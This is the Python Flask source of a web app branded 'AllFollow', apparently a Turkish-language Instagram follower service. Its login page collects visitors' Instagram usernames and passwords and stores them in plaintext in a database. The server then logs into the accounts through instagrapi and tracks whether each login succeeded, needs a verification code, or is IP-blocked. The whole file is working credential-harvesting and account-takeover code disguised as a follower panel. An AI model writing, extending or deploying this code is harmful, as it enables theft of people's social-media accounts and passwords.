import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Sırada")

def run_login(u, p):
    with app.app_context():
        cl = Client()
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            # Instagram'ın kapıyı kapatmaması için kısa bekleme
            time.sleep(3)
            # LOGIN İŞLEMİ - timeout parametresi ekleyerek kilitlenmeyi önlüyoruz
            cl.login(u, p)
            acc.status = "AKTIF"
            db.session.commit()
        except ChallengeRequired:
            acc.status = "KOD_ISTIYOR"
            db.session.commit()
        except BadPassword:
            acc.status = "HATALI_SIFRE"
            db.session.commit()
        except Exception as e:
            # Render IP'si bloklandığında buraya düşer
            acc.status = "SUNUCU_ENGELI"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="DENENIYOR")
        db.session.add(acc)
    else:
        acc.status = "DENENIYOR"
    db.session.commit()
    threading.Thread(target=run_login, args=(u, p)).start()
    return jsonify(status="baslatildi")

@app.route('/api/status/<u>')
def status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

HTML_CODE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white flex items-center justify-center min-h-screen">
    <div id="box" class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 w-80 text-center">
        <h1 class="text-2xl font-black text-purple-500 mb-6 italic">ALLFOLLOW</h1>
        <div id="form">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-3 outline-none focus:border-purple-500">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-zinc-800 p-3 rounded-xl mb-6 outline-none focus:border-purple-500">
            <button onclick="start()" class="w-full bg-purple-600 font-bold py-3 rounded-xl">GİRİŞ YAP</button>
        </div>
        <div id="status" class="hidden">
            <div class="animate-spin h-8 w-8 border-4 border-purple-500 border-t-transparent rounded-full mx-auto mb-4"></div>
            <p id="msg" class="font-bold">Instagram ile bağlantı kuruluyor...</p>
            <button onclick="location.reload()" class="mt-4 text-xs text-zinc-500 underline">İptal Et</button>
        </div>
    </div>

    <script>
        function start() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            if(!u || !p) return;
            document.getElementById('form').classList.add('hidden');
            document.getElementById('status').classList.remove('hidden');

            fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });

            const check = setInterval(async () => {
                const r = await fetch('/api/status/' + u);
                const d = await r.json();
                const msg = document.getElementById('msg');

                if(d.status === "AKTIF") {
                    clearInterval(check);
                    msg.innerText = "GİRİŞ BAŞARILI! ✅"; msg.className = "text-green-500 font-bold";
                    setTimeout(() => alert("Panele Hoş Geldin!"), 500);
                } else if(d.status === "KOD_ISTIYOR") {
                    clearInterval(check);
                    msg.innerText = "KOD GEREKLİ! ⚠️ (Instagram'dan kodu al)"; msg.className = "text-yellow-500";
                } else if(d.status === "SUNUCU_ENGELI") {
                    clearInterval(check);
                    msg.innerText = "IP ENGELİ! 🚫 (Proxy Lazım)"; msg.className = "text-red-500";
                } else if(d.status === "HATALI_SIFRE") {
                    clearInterval(check);
                    msg.innerText = "ŞİFRE YANLIŞ! ❌"; msg.className = "text-red-500";
                }
            }, 3000);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
